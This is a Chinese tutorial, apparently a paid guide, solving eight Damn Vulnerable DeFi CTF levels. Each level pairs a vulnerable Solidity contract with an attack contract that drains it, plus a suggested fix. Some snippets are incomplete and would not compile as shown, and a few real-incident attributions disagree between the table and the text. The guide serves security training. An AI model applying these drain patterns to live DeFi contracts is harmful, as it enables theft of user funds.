# Solidity 安全审计实战

## Damn Vulnerable DeFi 8 关全解

---

# 前言

Damn Vulnerable DeFi（DVDF）是 OpenZeppelin 出品的 DeFi 安全 CTF 挑战，
涵盖 DeFi 世界中最常见的漏洞类型。完成全部 8 关 = 掌握 DeFi 安全审计的
核心攻击面。

## 适合人群

- 有 Solidity 基础的开发者
- 想进入 Web3 安全领域的新手
- 准备参加 Immunefi / Cantina / Code4rena 的审计师

## 前置要求

- 了解 Solidity 基础语法
- 了解 ERC20 / Uniswap 基本概念
- 安装了 Node.js 和 solcjs

---

# 第一章：Damn Vulnerable DeFi 概览

## 项目结构

```
damn-vulnerable-defi/
├── contracts/          # 8 个关卡的原始漏洞合约
├── test/               # 测试文件
├── solutions/          # 攻击合约（本教程提供）
└── node_modules/       # 依赖
```

## 8 关总览

| 关卡 | 漏洞类型 | 难度 | 真实案例 |
|------|---------|------|---------|
| 1. Truster | 任意外部调用 | ⭐ | 多种 DeFi 攻击 |
| 2. Naive Receiver | 借款人未校验 | ⭐ | Eminence 攻击 |
| 3. Side Entrance | 存款抵还款 | ⭐⭐ | bZx 攻击 |
| 4. Puppet | 预言机操纵 | ⭐⭐ | Mango Markets |
| 5. Selfie | 治理攻击 | ⭐⭐⭐ | Beanstalk |
| 6. The Rewarder | 闪电贷刷奖励 | ⭐⭐ | Harvest Finance |
| 7. Unstoppable | DoS | ⭐ | 多种 DoS |
| 8. Compromised | 私钥泄露 | ⭐⭐ | Wintermute |

---

# 第二章：环境搭建

## 安装依赖

```bash
git clone https://github.com/zhangjiayang6835-cyber/damn-vulnerable-defi-solutions
cd damn-vulnerable-defi-solutions
npm install
```

## 编译合约

```bash
bash compile.sh
```

## 验证编译

```bash
# 检查编译产物
ls build/*.bin
```

---

# 第三章：逐关详解

## 第 1 关：Truster — 任意调用攻击

### 漏洞合约：TrusterLenderPool.sol

```
核心代码：
function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data)
    external nonReentrant
{
    uint256 balanceBefore = token.balanceOf(address(this));
    token.transfer(borrower, borrowAmount);
    target.call(data);  // ← 漏洞：无限制的外部调用
    require(token.balanceOf(address(this)) >= balanceBefore, "Flash loan not repaid");
}
```

### 漏洞分析

`target.call(data)` 没有对 target 地址和 data 做任何限制。
攻击者可以构造任意调用，让池子合约执行任何操作。

### 攻击思路

1. 调用 `flashLoan()`，传入 `target = token` 地址
2. `data = abi.encodeWithSignature("approve(address,uint256)", attacker, unlimited)`
3. 池子合约 approve 攻击者无限额度
4. 攻击者直接 `transferFrom()` 掏空池子

### 攻击合约

```solidity
contract TrusterAttack {
    function attack() external {
        uint256 poolBalance = token.balanceOf(address(pool));
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)", address(this), poolBalance
        );
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), attacker, poolBalance);
    }
}
```

### 真实案例

2020 年 bZx 攻击利用了类似的任意调用漏洞。

### 修复方案

限制 `target` 为已知的已审核合约，或实现白名单机制。

---

## 第 2 关：Naive Receiver — 借款人未校验

### 漏洞合约：NaiveReceiverLenderPool.sol

```solidity
function flashLoan(address borrower, uint256 borrowAmount, bytes calldata data)
    external nonReentrant
{
    uint256 balanceBefore = address(this).balance;
    payable(borrower).transfer(borrowAmount);
    // ← 漏洞：没有检查 caller == borrower
    require(address(this).balance >= balanceBefore, "Flash loan not repaid");
}
```

### 漏洞分析

任何人都可以以任意地址为借款人发起闪电贷。
每次闪电贷向借款人收取 1 ETH 的固定手续费。

### 攻击思路

1. 以受害者为借款人，循环调用 `flashLoan()` 
2. 每次受害者被扣 1 ETH
3. 直到受害者 ETH 耗尽

### 攻击合约

```solidity
contract NaiveReceiverAttack {
    function attack(address pool, address victim) external {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(victim, 0, "");
        }
    }
}
```

### 修复方案

检查 `msg.sender == borrower` 或将借款人参数设为 `msg.sender`。

---

## 第 3 关：Side Entrance — 存款抵还款

### 漏洞合约：SideEntranceLenderPool.sol

```solidity
function flashLoan(uint256 borrowAmount) external nonReentrant {
    uint256 balanceBefore = address(this).balance;
    IFlashLoanEtherReceiver(msg.sender).execute{value: borrowAmount}();
    require(address(this).balance >= balanceBefore, "Flash loan not repaid");
}

function deposit() external payable {
    balances[msg.sender] += msg.value;
}

function withdraw() external {
    uint256 amount = balances[msg.sender];
    balances[msg.sender] = 0;
    payable(msg.sender).transfer(amount);
}
```

### 漏洞分析

`flashLoan()` 的还款检查只看余额是否 >= 借款前余额。
没有检查还款来源是借款人的直接转账。
`deposit()` 存入的 ETH 会增加合约余额。

### 攻击思路

1. 借出 ETH
2. 不直接还款，而是调用 `deposit()` 存入 ETH
3. 余额检查通过（合约余额 >= 借款前）
4. 调用 `withdraw()` 取走全部存款

### 攻击合约

```solidity
contract SideEntranceAttack {
    function attack() external {
        pool.flashLoan(address(pool).balance);
    }
    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
    function withdraw() external {
        pool.withdraw();
    }
}
```

### 真实案例

多起闪电贷攻击都利用了"余额代替还款"的逻辑漏洞。

### 修复方案

跟踪每笔贷款的还款情况，而不是仅检查余额。

---

## 第 4 关：Puppet — 预言机操纵

### 漏洞合约：PuppetPool.sol

```solidity
function calculateDepositRequired(uint256 amount) public view returns (uint256) {
    // ← 漏洞：使用 Uniswap V1 单池价格作为预言机
    (uint256 reserveDVT, uint256 reserveWETH) = uniswap.getReserves();
    return amount * reserveWETH / reserveDVT * DEPOSIT_MULTIPLIER;
}
```

### 漏洞分析

使用 Uniswap V1 单流动性池的价格作为预言机。
攻击者可以通过买卖直接操纵池子价格。

### 攻击思路

1. 在 Uniswap 上大量卖出 DVT
2. DVT/ETH 价格暴跌
3. 只需要很少的 ETH 就能借走池中所有 DVT

### 攻击合约

```solidity
contract PuppetChallenge {
    function attack(uint256 amount) external {
        token.approve(address(uniswap), amount);
        // 大量卖出 DVT 砸盘
        uniswap.tokenToEthSwapInput(amount, 1, block.timestamp + 1);
        // 现在可以用极少 ETH 借走 DVT
    }
}
```

### 真实案例

2022 年 Mango Markets 被操纵预言机，损失 1.14 亿美元。

### 修复方案

使用 TWAP（时间加权平均价格）或多个预言机源。

---

## 第 5 关：Selfie — 快照治理攻击

### 漏洞合约：SelfiePool.sol + SimpleGovernance.sol

```solidity
// 治理代币要求：投票人拥有 >50% 总供应量的快照余额
function _hasEnoughVotes(address account) private view returns (bool) {
    uint256 balance = governanceToken.getBalanceAtLastSnapshot(account);
    uint256 halfTotalSupply = governanceToken.getTotalSupplyAtLastSnapshot() / 2;
    return balance > halfTotalSupply;
}
```

### 漏洞分析

1. 任何人都可以触发 ERC20Snapshot 的快照
2. 治理投票权基于快照余额，而非当前余额
3. `drainAllFunds()` 只有治理合约能调用

### 攻击思路

1. 闪电贷借出池中所有 DVT
2. 触发 `snapshot()` — 此时我们持有 >50% 的代币
3. 提案 `drainAllFunds(attacker)`
4. 归还闪电贷
5. 2 天后执行提案，拿走全部 DVT

### 攻击合约

```solidity
contract SelfieAttack {
    function receiveTokens(address, uint256 amount) external {
        token.snapshot();  // 快照
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", attacker);
        actionId = governance.queueAction(address(pool), data, 0);
        token.transfer(msg.sender, amount);  // 还贷
    }
}
```

### 真实案例

2022 年 Beanstalk 治理攻击，损失 1.82 亿美元。

### 修复方案

治理投票应基于历史余额而非闪电贷可得余额。

---

## 第 6 关：The Rewarder — 闪电贷刷奖励

### 漏洞合约：TheRewarderPool.sol

奖励计算基于存款时的快照。闪电贷借入大量 DVT →
存入奖励池 → 获得大量奖励代币 → 取出 DVT → 还贷。

### 攻击合约

```solidity
contract RewarderAttack {
    function receiveFlashLoan(uint256 amount) external {
        dvt.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);  // 存入获得奖励
        reward.transfer(attacker, reward.balanceOf(address(this)));  // 卷走奖励
        rewardPool.withdraw(amount);  // 取出
        dvt.transfer(msg.sender, amount);  // 还贷
    }
}
```

### 真实案例

2020 年 Harvest Finance 闪电贷攻击，损失 2400 万美元。

### 修复方案

奖励应在整个存款周期内线性释放，而非即时结算。

---

## 第 7 关：Unstoppable — 状态不一致 DoS

### 漏洞合约：UnstoppableLender.sol

```solidity
uint256 public poolBalance;  // 手动跟踪的余额

function depositTokens(uint256 amount) external {
    damnValuableToken.transferFrom(msg.sender, address(this), amount);
    poolBalance = poolBalance.add(amount);  // 通过 deposit 更新
}

function flashLoan(uint256 borrowAmount) external {
    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
    assert(poolBalance == balanceBefore);  // ← 漏洞：assert 检查
    ...
}
```

### 攻击思路

1. 直接向池子转账 1 个 DVT
2. `poolBalance` 没有更新，但 `balanceBefore` 增加了
3. `assert` 失败 → 所有 flashLoan 永久不可用

```solidity
contract UnstoppableAttack {
    function attack() external {
        dvt.transfer(pool, 1);  // DoS 成功
    }
}
```

### 修复方案

使用 `balanceOf()` 作为唯一数据源，删除 `poolBalance`。

---

## 第 8 关：Compromised — 预言机私钥泄露

### 漏洞分析

TrustfulOracle 的 trusted source 地址的私钥被泄露。
攻击者可以用私钥签名调用 `postPrice()` 任意修改价格。

### 攻击思路

1. 用泄露私钥设置 DVT 价格为 0
2. 低价买入大量 NFT
3. 用泄露私钥设置 DVT 价格为 999 ETH
4. 高价卖出 NFT 掏空 Exchange

### 注意

此攻击需要 ECDSA 私钥签名，无法在合约内完成。
需要用泄露的私钥直接从 EOA 调用 oracle.postPrice()。

---

# 第四章：真实赏金平台入门指南

## Immunefi

- 最大的 DeFi 漏洞赏金平台
- 需要 KYC 才能收款
- PoC 攻击合约是硬性要求

## Cantina

- 审计竞赛 + 赏金，已注册
- 小型项目适合入门

## Code4rena

- 审计竞赛平台
- 无需押金

## 常见漏洞赏金

| 漏洞类型 | Immunefi | Cantina |
|---------|----------|---------|
| Critical (直接盗取资金) | $50k~$250k | $50k~$2.5M |
| High (锁定资金等) | $5k~$70k | $10k~$100k |
| Medium (条件漏洞) | $1k~$10k | $1k~$50k |

## 提交技巧

1. 先验证（本地 fork 测试）
2. 写 PoC 攻击合约
3. 附修复建议
4. 用英文提交

---

# 第五章：进阶学习路线

```
Level 1: Solidity 基础
  ├── CryptoZombies
  ├── Ethernaut CTF
  └── ← 你在这里

Level 2: DeFi 安全基础
  ├── Damn Vulnerable DeFi ✓
  ├── 常见漏洞模式
  └── 阅读真实攻击报告

Level 3: 实战审计
  ├── Code4rena 竞赛
  ├── Cantina 赏金
  └── Immunefi 赏金

Level 4: 专业审计师
  ├── 独立审计合约
  ├── 写审计报告
  └── 复刻知名攻击
```

## 推荐资源

- rekt.news — 真实攻击案例分析
- Solidity by Example — 语法参考
- OpenZeppelin Contracts — 标准合约库
- SWC Registry — 智能合约漏洞分类

---

# 附录

## 合约代码包

本产品附带 8 个完整攻击合约：

```
contracts/
├── TrusterAttack.sol        # 任意调用攻击
├── NaiveReceiverAttack.sol   # 借款人未校验
├── SideEntranceAttack.sol    # 存款抵还款
├── PuppetAttack.sol          # 预言机操纵
├── SelfieAttack.sol          # 快照治理攻击
├── RewarderAttack.sol        # 闪电贷刷奖励
├── UnstoppableAttack.sol     # 状态不一致 DoS
└── CompromisedAttack.sol     # 私钥泄露
```

所有合约用 Solidity ^0.8.0 编写，编译通过。

## 编译脚本

```bash
bash compile.sh
```

## 联系方式

GitHub: https://github.com/zhangjiayang6835-cyber

---

**Solidity 安全审计实战 — Damn Vulnerable DeFi 8 关全解**
